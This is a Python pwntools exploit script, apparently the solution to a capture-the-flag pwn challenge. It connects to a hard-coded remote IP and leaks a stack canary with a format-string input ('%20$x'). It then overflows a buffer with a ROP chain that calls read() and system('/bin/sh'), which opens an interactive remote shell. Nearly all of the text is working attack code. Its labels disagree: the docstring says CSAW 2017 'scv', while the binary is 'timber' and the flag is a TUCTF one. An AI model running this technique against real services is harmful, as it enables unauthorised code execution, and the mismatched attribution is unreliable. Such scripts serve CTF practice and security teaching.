"""
CSAW 2017 scv pwn challenge solution
"""
# Imports
import re, sys, time
from pwn import *
# Set pwntools context to i386
context.update(arch='i386')

def rop_payload(elf):
  rop = ROP(elf)
  rop.read(0x0, 0x0804B048, 0x100)
  rop.system(0x0804B048)

  return str(rop)

def main():
  """
  Runs on program execution.
  """
  # Read challenge binary into pwntools
  elf = ELF('timber')

  # Connect to the remote sever
  p = remote('18.222.250.47', 12345)
  
  # Recieve until user input
  print p.recvuntil('Please enter your name: ')

  # Leak the canary value off the stack
  p.sendline('%20$x')
  canary = int(re.search(r'(Alright )(.*)',p.recvuntil('Options:')).group(2), 16)

  # Receive line until loop
  for i in range(4):
    print p.recvline()

  # Send r until a match is found
  output = ''
  while True:
    output = p.recv(4096)
    print output
    if '+Match Found!' in output:
      break
    p.sendline('r')

  # Send exploit
  p.sendline('A' * 48 + p32(canary) + 'B' * 8 + rop_payload(elf))

  # Send string '/bin/sh\x00' (used by rop payload)
  p.sendline('/bin/sh\x00')

  # Interact with shell
  p.interactive() # TUCTF{wh0_64v3_y0u_7h47_c4n4ry}

  
# Hook
if __name__ == '__main__':
  main()